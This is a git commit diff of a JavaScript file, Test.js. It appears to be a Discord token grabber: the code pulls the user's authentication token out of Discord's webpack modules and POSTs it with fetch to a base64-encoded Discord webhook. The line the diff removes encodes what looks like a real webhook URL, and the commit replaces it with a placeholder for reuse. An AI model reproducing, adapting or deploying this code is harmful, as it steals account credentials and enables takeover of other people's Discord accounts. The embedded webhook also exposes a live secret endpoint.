3cf15a66faede35b59952b1069f2e85a4970da17
Tung <89498812+tungdo0602@users.noreply.github.com>
2021-10-25 20:22:27 +0700

    Update Test.js

--- Test.js
+++ Test.js
@@ -5,7 +5,7 @@ var req = webpackJsonp.push([    [], {extra_id: (e, t, r) => e.exports = r},[   
             for (let e in t.default) "getToken" === e && (discordhacks = t.default.getToken())
     }
 fetch(
-  atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODk5NTg5NzA5MzQzMzYzMDkzL0JmYWNnUGtuTmdqbGVNMlhyLW1ncllsZTVtdmRrMXhuQ2NKcW1HdkxSODBtTkVNaXNhczFjbGpYbUF5T2VfM2dhZU9r'), 
+  atob('webhook_base64encode_here'), 
   {
     method: 'post',
     headers: {
